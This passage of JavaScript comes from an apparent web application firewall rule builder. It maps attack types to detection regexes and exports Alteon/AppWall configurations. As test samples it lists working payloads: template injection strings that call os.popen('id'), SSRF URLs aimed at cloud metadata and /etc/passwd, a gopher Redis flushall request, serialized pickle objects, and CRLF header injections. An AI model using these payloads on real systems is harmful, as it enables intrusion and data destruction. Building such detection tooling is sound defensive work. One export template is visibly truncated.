                    "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}",
                    "${7*7}",
                    "{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}",
                    "<%=7*7%>",
                    "{{ lipsum.__globals__['os'].popen('id').read() }}"
                ]
            },
            ssrf: {
                name: 'Server-Side Request Forgery',
                icon: 'fas fa-server',
                color: 'blue',
                severity: 'high',
                description: 'Prevent internal network access attempts',
                categories: {
                    'Internal IPs': [
                        { pattern: '(?:https?://)?(?:10\\.(?:[0-9]{1,3}\\.){2}[0-9]{1,3})', display: '10.x.x.x', desc: 'Private IP range 10.0.0.0/8', severity: 'high' },
                        { pattern: '(?:https?://)?(?:192\\.168\\.(?:[0-9]{1,3}\\.[0-9]{1,3}))', display: '192.168.x.x', desc: 'Private IP range 192.168.0.0/16', severity: 'high' },
                        { pattern: '(?:https?://)?(?:172\\.(?:1[6-9]|2[0-9]|3[01])\\.(?:[0-9]{1,3}\\.[0-9]{1,3}))', display: '172.16-31.x.x', desc: 'Private IP range 172.16.0.0/12', severity: 'high' },
                        { pattern: '(?:https?://)?(?:127\\.0\\.0\\.1|localhost)', display: 'localhost', desc: 'Loopback address', severity: 'critical' }
                    ],
                    'Special Protocols': [
                        { pattern: '(?i)file:///', display: 'file://', desc: 'File protocol access', severity: 'critical' },
                        { pattern: '(?i)gopher:///', display: 'gopher://', desc: 'Gopher protocol access', severity: 'high' },
                        { pattern: '(?i)dict:///', display: 'dict://', desc: 'Dictionary protocol', severity: 'medium' },
                        { pattern: '(?i)ftp:///', display: 'ftp://', desc: 'FTP protocol access', severity: 'medium' }
                    ],
                    'Cloud Metadata': [
                        { pattern: '(?i)169\\.254\\.169\\.254', display: 'AWS Metadata', desc: 'AWS metadata service', severity: 'critical' },
                        { pattern: '(?i)metadata\\.google\\.internal', display: 'GCP Metadata', desc: 'Google Cloud metadata', severity: 'critical' },
                        { pattern: '(?i)169\\.254\\.169\\.255', display: 'Azure Metadata', desc: 'Azure metadata service', severity: 'critical' }
                    ],
                    'URL Bypasses': [
                        { pattern: '(?i)0x[0-9a-f]+', display: 'Hex IP', desc: 'Hexadecimal IP encoding', severity: 'medium' },
                        { pattern: '(?i)[0-9]+\\.[0-9]+', display: 'Decimal IP', desc: 'Decimal IP notation', severity: 'medium' }
                    ]
                },
                samples: [
                    "http://127.0.0.1:8080/admin",
                    "http://169.254.169.254/latest/meta-data/",
                    "gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
                    "file:///etc/passwd",
                    "http://192.168.1.1/config",
                    "dict://localhost:11211/stat"
                ]
            },
            deserialization: {
                name: 'Insecure Deserialization',
                icon: 'fas fa-box-open',
                color: 'indigo',
                severity: 'critical',
                description: 'Detect malicious serialized object attacks',
                categories: {
                    'Java Serialization': [
                        { pattern: 'rO0AB', display: 'Java Serialized', desc: 'Java serialization magic bytes (base64)', severity: 'critical' },
                        { pattern: '\\xac\\xed\\x00\\x05', display: 'Java Binary', desc: 'Java serialization binary header', severity: 'critical' },
                        { pattern: 'java\\.lang\\.Runtime', display: 'Runtime Class', desc: 'Java Runtime class reference', severity: 'critical' },
                        { pattern: 'java\\.lang\\.ProcessBuilder', display: 'ProcessBuilder', desc: 'Java ProcessBuilder class', severity: 'critical' }
                    ],
                    'Python Pickle': [
                        { pattern: '\\x80\\x03', display: 'Pickle Protocol', desc: 'Python pickle protocol marker', severity: 'critical' },
                        { pattern: 'c__builtin__', display: 'Builtin Module', desc: 'Python builtin module access', severity: 'critical' },
                        { pattern: 'csubprocess', display: 'Subprocess Module', desc: 'Python subprocess module', severity: 'critical' },
                        { pattern: 'cos\\nsystem', display: 'OS System', desc: 'Python os.system function', severity: 'critical' }
                    ],
                    'PHP Serialization': [
                        { pattern: 'O:[0-9]+:"[^"]*":[0-9]+:\\{', display: 'PHP Object', desc: 'PHP serialized object pattern', severity: 'high' },
                        { pattern: 'a:[0-9]+:\\{', display: 'PHP Array', desc: 'PHP serialized array pattern', severity: 'medium' },
                        { pattern: '__destruct', display: '__destruct', desc: 'PHP destructor method', severity: 'high' },
                        { pattern: '__wakeup', display: '__wakeup', desc: 'PHP wakeup method', severity: 'high' }
                    ],
                    '.NET Serialization': [
                        { pattern: 'AAEAAAD/', display: '.NET Binary', desc: '.NET binary formatter header', severity: 'critical' },
                        { pattern: 'System\\.Diagnostics\\.Process', display: 'Process Class', desc: '.NET Process class reference', severity: 'critical' },
                        { pattern: 'mscorlib', display: 'mscorlib', desc: '.NET core library reference', severity: 'medium' }
                    ]
                },
                samples: [
                    "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkAGXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAABYXQAAWJ4",
                    "\\x80\\x03cos\\nsystem\\nq\\x00X\\x02\\x00\\x00\\x00idq\\x01\\x85q\\x02Rq\\x03.",
                    "O:8:\"stdClass\":1:{s:4:\"exec\";s:6:\"whoami\";}",
                    "AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAAAmU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuU29ydGVkU2V0YDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9u"
                ]
            },
            crlf: {
                name: 'CRLF Injection',
                icon: 'fas fa-exchange-alt',
                color: 'orange',
                severity: 'medium',
                description: 'Prevent HTTP header manipulation attacks',
                categories: {
                    'CRLF Sequences': [
                        { pattern: '\\r\\n', display: '\\r\\n', desc: 'Carriage return + line feed', severity: 'medium' },
                        { pattern: '\\n', display: '\\n', desc: 'Line feed only', severity: 'low' },
                        { pattern: '\\r', display: '\\r', desc: 'Carriage return only', severity: 'low' }
                    ],
                    'URL Encoded': [
                        { pattern: '%0d%0a', display: '%0d%0a', desc: 'URL encoded CRLF', severity: 'medium' },
                        { pattern: '%0D%0A', display: '%0D%0A', desc: 'URL encoded CRLF (uppercase)', severity: 'medium' },
                        { pattern: '%250d%250a', display: 'Double encoded', desc: 'Double URL encoded CRLF', severity: 'medium' }
                    ],
                    'Header Injection': [
                        { pattern: '(?i)\\r\\n(?:set-cookie|location|content-type)\\s*:', display: 'Header Injection', desc: 'HTTP header injection attempt', severity: 'high' },
                        { pattern: '(?i)%0d%0a(?:set-cookie|location)', display: 'Encoded Header', desc: 'Encoded header injection', severity: 'high' }
                    ]
                },
                samples: [
                    "\\r\\nSet-Cookie: admin=true",
                    "%0d%0aLocation: http://evil.com",
                    "\\nContent-Type: text/html\\r\\n\\r\\n<script>alert('XSS')< /script>",
                    "%0D%0ASet-Cookie: sessionid=malicious"
                ]
            },
            unicode: {
                name: 'Unicode/Encoding Attacks',
                icon: 'fas fa-language',
                color: 'purple',
                severity: 'medium',
                description: 'Detect encoding-based bypass attempts',
                categories: {
                    'URL Encoding': [
                        { pattern: '%[0-9a-fA-F]{2}', display: '%XX', desc: 'Standard URL encoding', severity: 'low' },
                        { pattern: '%u[0-9a-fA-F]{4}', display: '%uXXXX', desc: 'Unicode URL encoding', severity: 'medium' },
                        { pattern: '%25[0-9a-fA-F]{2}', display: 'Double Encoding', desc: 'Double URL encoding', severity: 'medium' }
                    ],
                    'HTML Entities': [
                        { pattern: '&#x[0-9a-fA-F]+;', display: '&#xXX;', desc: 'Hexadecimal HTML entity', severity: 'medium' },
                        { pattern: '&#[0-9]+;', display: '&#XX;', desc: 'Decimal HTML entity', severity: 'medium' },
                        { pattern: '&[a-zA-Z]+;', display: 'Named Entity', desc: 'Named HTML entity', severity: 'low' }
                    ],
                    'Unicode Escapes': [
                        { pattern: '\\\\u[0-9a-fA-F]{4}', display: '\\uXXXX', desc: 'Unicode escape sequence', severity: 'medium' },
                        { pattern: '\\\\x[0-9a-fA-F]{2}', display: '\\xXX', desc: 'Hexadecimal escape sequence', severity: 'medium' },
                        { pattern: '\\\\[0-7]{3}', display: '\\XXX', desc: 'Octal escape sequence', severity: 'low' }
                    ],
                    'Overlong Encoding': [
                        { pattern: '%c0%af', display: 'UTF-8 Overlong', desc: 'UTF-8 overlong encoding', severity: 'high' },
                        { pattern: '%e0%80%af', display: 'UTF-8 3-byte', desc: 'UTF-8 3-byte overlong', severity: 'high' }
                    ]
                },
                samples: [
                    "%2e%2e%2f",
                    "&#x3C;script&#x3E;",
                    "\\u003cscript\\u003e",
                    "%c0%af%c0%af",
                    "%u0022%u003e%u003cscript%u003e",
                    "&#60;&#115;&#99;&#114;"
                ]
            }
        };

        // Global state
        let selectedPatterns = new Set();
        let selectedAttacks = new Set();
        let currentRegex = '';
        let exportFormat = 'alteon';
        let panelCollapsed = false;
        let difficultyLevel = 'basic';

        // Presets configuration
        const presets = {
            'web-basic': {
                name: 'Basic Web Protection',
                attacks: ['sqli', 'xss', 'lfi'],
                description: 'Essential protection against common web attacks'
            },
            'api-security': {
                name: 'API Security',
                attacks: ['jsonparsing', 'nosqli', 'xxe', 'httpheaders'],
                description: 'Protection for REST APIs and web services'
            },
            'high-security': {
                name: 'High Security',
                attacks: ['sqli', 'xss', 'cmdi', 'lfi', 'rfi', 'xxe', 'ssrf', 'ssti', 'deserialization'],
                description: 'Comprehensive protection against critical vulnerabilities'
            },
            'owasp-top10': {
                name: 'OWASP Top 10',
                attacks: ['sqli', 'xss', 'xxe', 'ssrf', 'deserialization', 'cmdi', 'lfi', 'nosqli'],
                description: 'Protection against OWASP Top 10 vulnerabilities'
            },
            'file-upload': {
                name: 'File Upload Protection',
                attacks: ['fileupload', 'lfi', 'rfi', 'dirbruteforce'],
                description: 'Secure file upload and directory access'
            },
            'json-api': {
                name: 'JSON/REST API',
                attacks: ['jsonparsing', 'nosqli', 'httpheaders', 'uriparams', 'utf8unicode'],
                description: 'JSON and REST API specific protections'
            }
        };

        // Initialize application
        document.addEventListener('DOMContentLoaded', function() {
            loadAttackTypes();
            updateStats();
            updateExport();
            
            // Auto-save state
            setInterval(saveState, 10000);
            loadState();
        });

        // Set difficulty level
        function setDifficulty(level) {
            difficultyLevel = level;
            document.querySelectorAll('.difficulty-btn').forEach(btn => {
                btn.classList.toggle('active', btn.dataset.level === level);
            });
            
            // Filter patterns based on difficulty
            loadPatternCategories();
        }

        // Apply preset configuration
        function applyPreset(presetKey) {
            const preset = presets[presetKey];
            if (!preset) return;
            
            // Clear current selections
            selectedAttacks.clear();
            selectedPatterns.clear();
            
            // Reset UI
            document.querySelectorAll('.attack-card').forEach(card => {
                card.classList.remove('selected');
                const checkbox = card.querySelector('.w-4.h-4');
                const checkIcon = card.querySelector('.fa-check');
                checkbox.classList.remove('bg-blue-600', 'border-blue-600');
                checkbox.classList.add('border-gray-300');
                checkIcon.classList.add('hidden');
            });
            
            // Apply preset attacks
            preset.attacks.forEach(attackKey => {
                toggleAttack(attackKey);
            });
            
            // Update preset button states
            document.querySelectorAll('.preset-btn').forEach(btn => {
                btn.classList.toggle('active', btn.getAttribute('onclick').includes(presetKey));
            });
            
            // Auto-select some patterns for each attack based on severity
            setTimeout(() => {
                preset.attacks.forEach(attackKey => {
                    const attack = attackPatterns[attackKey];
                    if (attack) {
                        Object.values(attack.categories).forEach(patterns => {
                            patterns.forEach(pattern => {
                                // Auto-select high and critical severity patterns
                                if (pattern.severity === 'high' || pattern.severity === 'critical') {
                                    selectedPatterns.add(pattern.pattern);
                                }
                            });
                        });
                    }
                });
                
                // Update UI to reflect auto-selected patterns
                document.querySelectorAll('.pattern-chip').forEach(chip => {
                    const patternOnclick = chip.getAttribute('onclick');
                    if (patternOnclick) {
                        const match = patternOnclick.match(/togglePattern\('([^']+)'/);
                        if (match) {
                            const pattern = match[1].replace(/&#39;/g, "'").replace(/&quot;/g, '"');
                            if (selectedPatterns.has(pattern)) {
                                chip.classList.add('active');
                            }
                        }
                    }
                });
                
                updateRegex();
                updateStats();
            }, 100);
        }

        // Load attack types into the UI
        function loadAttackTypes() {
            const container = document.getElementById('attackTypes');
            const totalCount = Object.keys(attackPatterns).length;
            document.getElementById('totalCount').textContent = totalCount;
            
            container.innerHTML = Object.entries(attackPatterns).map(([key, attack]) => `
                <div class="attack-card" data-attack="${key}" onclick="toggleAttack('${key}')">
                    <div class="flex items-start gap-4">
                        <div class="flex-shrink-0">
                            <div class="w-12 h-12 rounded-lg bg-${attack.color}-100 flex items-center justify-center">
                                <i class="${attack.icon} text-${attack.color}-600 text-xl"></i>
                            </div>
                        </div>
                        <div class="flex-1 min-w-0">
                            <div class="flex items-center gap-3 mb-2">
                                <h3 class="font-semibold text-gray-800 truncate">${attack.name}</h3>
                                <span class="severity-${attack.severity} text-xs font-medium px-2 py-1 rounded-full">
                                    ${attack.severity.toUpperCase()}
                                </span>
                            </div>
                            <p class="text-sm text-gray-600 mb-3">${attack.description}</p>
                            <div class="flex items-center justify-between">
                                <span class="text-xs text-gray-500">
                                    ${Object.values(attack.categories).reduce((sum, cat) => sum + cat.length, 0)} patterns
                                </span>
                                <div class="w-4 h-4 border-2 border-gray-300 rounded transition-all">
                                    <i class="fas fa-check text-white text-xs hidden"></i>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            `).join('');
        }

        // Toggle attack type selection
        function toggleAttack(attackKey) {
            const card = document.querySelector(`[data-attack="${attackKey}"]`);
            const checkbox = card.querySelector('.w-4.h-4');
            const checkIcon = card.querySelector('.fa-check');
            
            if (selectedAttacks.has(attackKey)) {
                selectedAttacks.delete(attackKey);
                card.classList.remove('selected');
                checkbox.classList.remove('bg-blue-600', 'border-blue-600');
                checkbox.classList.add('border-gray-300');
                checkIcon.classList.add('hidden');
                
                // Remove patterns from this attack type
                Object.values(attackPatterns[attackKey].categories).forEach(patterns => {
                    patterns.forEach(pattern => {
                        selectedPatterns.delete(pattern.pattern);
                    });
                });
            } else {
                selectedAttacks.add(attackKey);
                card.classList.add('selected');
                checkbox.classList.remove('border-gray-300');
                checkbox.classList.add('bg-blue-600', 'border-blue-600');
                checkIcon.classList.remove('hidden');
            }
            
            document.getElementById('selectedCount').textContent = selectedAttacks.size;
            loadPatternCategories();
            updateRegex();
            updateStats();
        }

        // Load pattern categories for selected attacks
        function loadPatternCategories() {
            const container = document.getElementById('patternCategories');
            
            if (selectedAttacks.size === 0) {
                container.innerHTML = `
                    <div class="text-center text-gray-500 py-8">
                        <i class="fas fa-arrow-up text-2xl mb-3"></i>
                        <p>Select attack types above to see available patterns</p>
                    </div>
                `;
                return;
            }
            
            const selectedAttackTypes = Array.from(selectedAttacks).map(key => attackPatterns[key]);
            
            container.innerHTML = selectedAttackTypes.map(attack => `
                <div class="mb-6">
                    <h4 class="font-bold text-gray-800 mb-3 flex items-center gap-2">
                        <i class="${attack.icon} text-${attack.color}-600"></i>
                        ${attack.name} Patterns
                    </h4>
                    ${Object.entries(attack.categories).map(([categoryName, patterns]) => {
                        // Filter patterns based on difficulty level
                        let filteredPatterns = patterns;
                        if (difficultyLevel === 'basic') {
                            filteredPatterns = patterns.filter(p => p.severity === 'high' || p.severity === 'critical');
                        } else if (difficultyLevel === 'advanced') {
                            filteredPatterns = patterns.filter(p => p.severity !== 'low');
                        }
                        
                        if (filteredPatterns.length === 0) return '';
                        
                        return `
                            <div class="mb-4">
                                <h5 class="text-sm font-medium text-gray-600 mb-2">${categoryName}</h5>
                                <div class="flex flex-wrap gap-2">
                                    ${filteredPatterns.map(pattern => `
                                        <div class="pattern-chip ${selectedPatterns.has(pattern.pattern) ? 'active' : ''}" 
                                             onclick="togglePattern('${escapeForAttribute(pattern.pattern)}', this)"
                                             title="${pattern.desc}">
                                            <code class="text-xs">${escapeHtml(pattern.display)}</code>
                                            <span class="severity-${pattern.severity} text-xs">●</span>
                                        </div>
                                    `).join('')}
                                </div>
                            </div>
                        `;
                    }).join('')}
                </div>
            `).join('');
        }

        // Escape HTML for safe display
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        // Escape for HTML attributes
        function escapeForAttribute(text) {
            return text.replace(/'/g, '&#39;').replace(/"/g, '&quot;');
        }

        // Toggle pattern selection
        function togglePattern(patternString, element) {
            // Unescape the pattern string
            const pattern = patternString.replace(/&#39;/g, "'").replace(/&quot;/g, '"');
            
            if (selectedPatterns.has(pattern)) {
                selectedPatterns.delete(pattern);
                element.classList.remove('active');
            } else {
                selectedPatterns.add(pattern);
                element.classList.add('active');
            }
            
            updateRegex();
            updateStats();
        }

        // Update regex pattern
        function updateRegex() {
            if (selectedPatterns.size === 0) {
                currentRegex = '';
                document.getElementById('regexPattern').textContent = 'Select patterns to generate regex...';
                return;
            }
            
            let patterns = Array.from(selectedPatterns);
            let regex = patterns.join('|');
            
            // Apply options
            const options = [];
            if (document.getElementById('caseInsensitive')?.checked) {
                if (!regex.startsWith('(?i)')) {
                    regex = '(?i)' + regex;
                }
            }
            if (document.getElementById('multiline')?.checked) {
                options.push('m');
            }
            if (document.getElementById('wordBoundaries')?.checked) {
                regex = '\\b(' + regex + ')\\b';
            }
            
            // Wrap in non-capturing group if multiple patterns
            if (patterns.length > 1) {
                regex = '(?:' + regex + ')';
            }
            
            currentRegex = regex;
            document.getElementById('regexPattern').textContent = regex;
            
            // Test current input
            testRegex();
            updateExport();
        }

        // Test regex against input
        function testRegex() {
            const testInput = document.getElementById('testInput')?.value || '';
            const resultsDiv = document.getElementById('testResults');
            const detailsDiv = document.getElementById('matchDetails');
            
            if (!currentRegex || !testInput) {
                if (resultsDiv) {
                    resultsDiv.className = 'test-result test-no-match';
                    resultsDiv.textContent = !testInput ? 'No test input provided' : 'No regex pattern generated';
                }
                if (detailsDiv) {
                    detailsDiv.textContent = 'Test your pattern to see match details';
                }
                return;
            }
            
            try {
                const regex = new RegExp(currentRegex, 'gi');
                const matches = testInput.match(regex);
                
                if (matches) {
                    resultsDiv.className = 'test-result test-match';
                    resultsDiv.innerHTML = `
                        <i class="fas fa-exclamation-triangle"></i>
                        <strong>BLOCKED:</strong> ${matches.length} match${matches.length > 1 ? 'es' : ''} found
                    `;
                    detailsDiv.innerHTML = `
                        <div class="font-medium text-red-700 mb-2">Matches found:</div>
                        <div class="space-y-1">
                            ${matches.slice(0, 5).map((match, i) => `
                                <div class="bg-red-50 px-2 py-1 rounded text-xs font-mono">
                                    Match ${i + 1}: "${escapeHtml(match)}"
                                </div>
                            `).join('')}
                            ${matches.length > 5 ? `<div class="text-xs text-gray-600">... and ${matches.length - 5} more</div>` : ''}
                        </div>
                    `;
                } else {
                    resultsDiv.className = 'test-result test-no-match';
                    resultsDiv.innerHTML = `
                        <i class="fas fa-check-circle"></i>
                        <strong>ALLOWED:</strong> No malicious patterns detected
                    `;
                    detailsDiv.textContent = 'Input passed all security checks';
                }
            } catch (error) {
                resultsDiv.className = 'test-result test-no-match';
                resultsDiv.innerHTML = `
                    <i class="fas fa-exclamation-circle"></i>
                    <strong>ERROR:</strong> Invalid regex pattern
                `;
                detailsDiv.textContent = `Regex error: ${error.message}`;
            }
        }

        // Update statistics
        function updateStats() {
            document.getElementById('patternCount').textContent = selectedPatterns.size;
            document.getElementById('activePatternsCount').textContent = selectedPatterns.size;
            document.getElementById('activeAttackTypesCount').textContent = selectedAttacks.size;
            document.getElementById('regexLength').textContent = currentRegex.length;
            
            // Calculate complexity
            let complexity = 'Low';
            if (selectedPatterns.size > 20) complexity = 'High';
            else if (selectedPatterns.size > 10) complexity = 'Medium';
            
            document.getElementById('complexityScore').textContent = complexity;
            
            // Calculate performance score
            let performance = 'Good';
            if (currentRegex.length > 500) performance = 'Poor';
            else if (currentRegex.length > 200) performance = 'Fair';
            
            document.getElementById('performanceScore').textContent = performance;
            
            // Load sample payloads
            loadSamplePayloads();
        }

        // Load sample payloads for testing
        function loadSamplePayloads() {
            const container = document.getElementById('samplePayloads');
            if (!container) return;
            
            const samples = [];
            selectedAttacks.forEach(attackKey => {
                const attack = attackPatterns[attackKey];
                samples.push(...attack.samples.slice(0, 3));
            });
            
            if (samples.length === 0) {
                container.innerHTML = '<div class="text-xs text-gray-500">Select attack types to see sample payloads</div>';
                return;
            }
            
            container.innerHTML = samples.slice(0, 8).map(sample => `
                <div class="payload-item" onclick="loadSampleIntoTest('${escapeForAttribute(sample)}')">
                    ${escapeHtml(sample)}
                </div>
            `).join('');
        }

        // Load sample payload into test input
        function loadSampleIntoTest(sample) {
            const unescaped = sample.replace(/&#39;/g, "'").replace(/&quot;/g, '"');
            document.getElementById('testInput').value = unescaped;
            testRegex();
        }

        // Select export format
        function selectExportFormat(format) {
            exportFormat = format;
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            document.querySelector(`[data-format="${format}"]`).classList.add('active');
            updateExport();
        }

        // Update export output
        function updateExport() {
            const output = document.getElementById('exportOutput');
            if (!output) return;
            
            const ruleName = document.getElementById('ruleName')?.value || 'WAF_SECURITY_RULE_001';
            const description = document.getElementById('ruleDescription')?.value || 'Blocks common web application attacks';
            const severity = document.getElementById('ruleSeverity')?.value || 'high';
            const action = document.getElementById('ruleAction')?.value || 'block';
            
            if (!currentRegex) {
                output.textContent = '# Select patterns and configure details to generate export';
                return;
            }
            
            let exportText = '';
            
            switch (exportFormat) {
                case 'alteon':
                    exportText = `# Radware Alteon WAF Configuration
# Rule: ${ruleName}
# Description: ${description}
# Generated: ${new Date().toISOString()}
# Attack Types: ${Array.from(selectedAttacks).join(', ')}
# Pattern Count: ${selectedPatterns.size}

/cfg/security/appwall/policy
    name "${ruleName}"
    ena
    mode inline

/cfg/security/appwall/policy/rule
    name "${ruleName}_RULE"
    ena
    type custom
    regex "${currentRegex.replace(/"/g, '\\"')}"
    action ${action}
    severity ${severity}
    description "${description}"

# Apply to specific URLs
/cfg/security/appwall/policy/rule/match
    url ena
    header ena
    query ena
    body ena
    cookie ena

# Additional protection settings
/cfg/security/appwall/policy/protection
    sqli ${selectedAttacks.has('sqli') ? 'ena' : 'dis'}
    xss ${selectedAttacks.has('xss') ? 'ena' : 'dis'}
    cmdi ${selectedAttacks.has('cmdi') ? 'ena' : 'dis'}
    
# Apply the rule to virtual service
/cfg/slb/virt 1/service 80
    appwall policy "${ruleName}"`;
                    break;
                    
                case 'appwall':
                    exportText = `<?xml version="1.0" encoding="UTF-8"?>
<!-- Radware AppWall Configuration -->
]]></Pattern>
            <Action>${action}</Action>
            <Severity>${severity}</Severity>
            <Enabled>true</Enabled>
        </Rule>
        <ApplyTo>
            <URL>true</URL>
            <QueryString>true</QueryString>
            <Headers>true</Headers>
            <Body>true</Body>
            <Cookies>true</Cookies>
            <JSON>true</JSON>
            <XML>true</XML>
            <Multipart>true</Multipart>
        </ApplyTo>
        <ProtectionModules>
            ${Array.from(selectedAttacks).map(attack => `<Module name="${attack}" enabled="true"/>`).join('\n            ')}
        </ProtectionModules>
    </Policy>
</AppWallConfiguration>`;
                    break;
                    
                case 'json':
                    const attackDetails = {};
                    selectedAttacks.forEach(attackKey => {
                        const attack = attackPatterns[attackKey];
                        const selectedFromAttack = [];
                        Object.entries(attack.categories).forEach(([category, patterns]) => {
                            patterns.forEach(pattern => {
                                if (selectedPatterns.has(pattern.pattern)) {
                                    selectedFromAttack.push({
                                        category: category,
                                        display: pattern.display,
                                        description: pattern.desc,
                                        severity: pattern.severity,
                                        pattern: pattern.pattern
                                    });
                                }
                            });
                        });
                        attackDetails[attackKey] = {
                            name: attack.name,
                            severity: attack.severity,
                            patterns: selectedFromAttack
                        };
                    });
                    
                    exportText = JSON.stringify({
                        name: ruleName,
                        description: description,
                        type: "waf_rule",
                        severity: severity,
                        action: action,
                        pattern: currentRegex,
                        attack_types: Array.from(selectedAttacks),
                        attack_details: attackDetails,
                        pattern_count: selectedPatterns.size,
                        created: new Date().toISOString(),
                        difficulty_level: difficultyLevel,
                        options: {
                            case_insensitive: document.getElementById('caseInsensitive')?.checked || false,
                            multiline: document.getElementById('multiline')?.checked || false,
                            word_boundaries: document.getElementById('wordBoundaries')?.checked || false
                        },
                        metadata: {
                            version: "2.0",
                            generator: "Alteon WAF Regex Builder Pro - Advanced Edition",
                            regex_length: currentRegex.length,
                            complexity: document.getElementById('complexityScore')?.textContent || 'Unknown'
                        }
                    }, null, 2);
                    break;
            }
            
            output.textContent = exportText;
        }

        // Utility functions
        function copyRegex() {
            if (!currentRegex) return;
            
            navigator.clipboard.writeText(currentRegex).then(() => {
                const btn = document.querySelector('.copy-btn');
                const original = btn.innerHTML;
                btn.innerHTML = '<i class="fas fa-check"></i> Copied!';
                btn.classList.add('copied');
                
                setTimeout(() => {
                    btn.innerHTML = original;
                    btn.classList.remove('copied');
                }, 2000);
            });
        }

        function copyExport() {
            const exportText = document.getElementById('exportOutput').textContent;
            if (exportText.startsWith('#')) return;
            
            navigator.clipboard.writeText(exportText).then(() => {
                const btn = event.currentTarget;
                const original = btn.innerHTML;
                btn.innerHTML = '<i class="fas fa-check"></i> Copied!';
                btn.classList.add('bg-green-600');
                
                setTimeout(() => {
                    btn.innerHTML = original;
                    btn.classList.remove('bg-green-600');
                }, 2000);
            });
        }

        function downloadExport() {
            const exportText = document.getElementById('exportOutput').textContent;
            if (exportText.startsWith('#')) return;
            
            const ruleName = document.getElementById('ruleName')?.value || 'WAF_SECURITY_RULE';
            const extension = exportFormat === 'json' ? 'json' : exportFormat === 'appwall' ? 'xml' : 'txt';
            const filename = `${ruleName.replace(/[^a-zA-Z0-9]/g, '_')}.${extension}`;
            
            const blob = new Blob([exportText], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        }

        function selectAllPatterns() {
            document.querySelectorAll('.pattern-chip').forEach(chip => {
                if (!chip.classList.contains('active')) {
                    chip.click();
                }
            });
        }

        function clearAllPatterns() {
            selectedPatterns.clear();
            document.querySelectorAll('.pattern-chip.active').forEach(chip => {
                chip.classList.remove('active');
            });
            updateRegex();
            updateStats();
        }

        function optimizeRegex() {
            if (selectedPatterns.size === 0) return;
            
            // Group patterns by similarity
            const patterns = Array.from(selectedPatterns);
            const optimizedPatterns = [];
            
            // Group similar patterns
            const groups = {};
            patterns.forEach(pattern => {
                // Simple grouping by common prefixes
                const prefix = pattern.substring(0, 10);
                if (!groups[prefix]) {
                    groups[prefix] = [];
                }
                groups[prefix].push(pattern);
            });
            
            // Optimize each group
            Object.values(groups).forEach(group => {
                if (group.length > 1) {
                    // Try to find common parts
                    // For now, just remove duplicates
                    const unique = [...new Set(group)];
                    optimizedPatterns.push(...unique);
                } else {
                    optimizedPatterns.push(...group);
                }
            });
            
            // Sort by length to put shorter patterns first
            optimizedPatterns.sort((a, b) => a.length - b.length);
            
            selectedPatterns.clear();
            optimizedPatterns.forEach(pattern => selectedPatterns.add(pattern));
            
            updateRegex();
            updateStats();
            
            // Show notification
            const btn = event.currentTarget;
            const original = btn.innerHTML;
            btn.innerHTML = '<i class="fas fa-check"></i> Optimized!';
            btn.classList.add('bg-green-600');
            
            setTimeout(() => {
                btn.innerHTML = original;
                btn.classList.remove('bg-green-600');
            }, 2000);
        }

        function togglePanel() {
            const panel = document.getElementById('floatingPanel');
            panelCollapsed = !panelCollapsed;
            panel.classList.toggle('collapsed', panelCollapsed);
        }

        function resetAll() {
            if (confirm('Reset all selections and start over?')) {
                selectedAttacks.clear();
                selectedPatterns.clear();
                currentRegex = '';
                
                document.querySelectorAll('.attack-card.selected').forEach(card => {
                    card.classList.remove('selected');
                    const checkbox = card.querySelector('.w-4.h-4');
                    const checkIcon = card.querySelector('.fa-check');
                    checkbox.classList.remove('bg-blue-600', 'border-blue-600');
                    checkbox.classList.add('border-gray-300');
                    checkIcon.classList.add('hidden');
                });
                
                document.getElementById('selectedCount').textContent = '0';
                loadPatternCategories();
                updateRegex();
                updateStats();
                
                // Reset presets
                document.querySelectorAll('.preset-btn').forEach(btn => {
                    btn.classList.remove('active');
                });
            }
        }

        function generateReport() {
            const report = {
                timestamp: new Date().toISOString(),
                summary: {
                    attack_types: selectedAttacks.size,
                    total_patterns: selectedPatterns.size,
                    regex_length: currentRegex.length,
                    complexity: document.getElementById('complexityScore').textContent,
                    difficulty_level: difficultyLevel
                },
                selected_attacks: Array.from(selectedAttacks).map(attackKey => ({
                    key: attackKey,
                    name: attackPatterns[attackKey].name,
                    severity: attackPatterns[attackKey].severity
                })),
                regex_pattern: currentRegex,
                pattern_details: [],
                recommendations: generateRecommendations()
            };
            
            // Add pattern details
            selectedAttacks.forEach(attackKey => {
                const attack = attackPatterns[attackKey];
                Object.entries(attack.categories).forEach(([category, patterns]) => {
                    patterns.forEach(pattern => {
                        if (selectedPatterns.has(pattern.pattern)) {
                            report.pattern_details.push({
                                attack_type: attack.name,
                                category: category,
                                pattern: pattern.display,
                                description: pattern.desc,
                                severity: pattern.severity
                            });
                        }
                    });
                });
            });
            
            const blob = new Blob([JSON.stringify(report, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `waf_security_report_${Date.now()}.json`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        }

        function generateRecommendations() {
            const recommendations = [];
            
            if (selectedPatterns.size > 50) {
                recommendations.push("Consider splitting into multiple rules for better performance");
            }
            
            if (!selectedAttacks.has('sqli') && selectedAttacks.size > 0) {
                recommendations.push("Consider adding SQL injection protection - it's one of the most common attacks");
            }
            
            if (!selectedAttacks.has('xss') && selectedAttacks.size > 0) {
                recommendations.push("Consider adding XSS protection for comprehensive security");
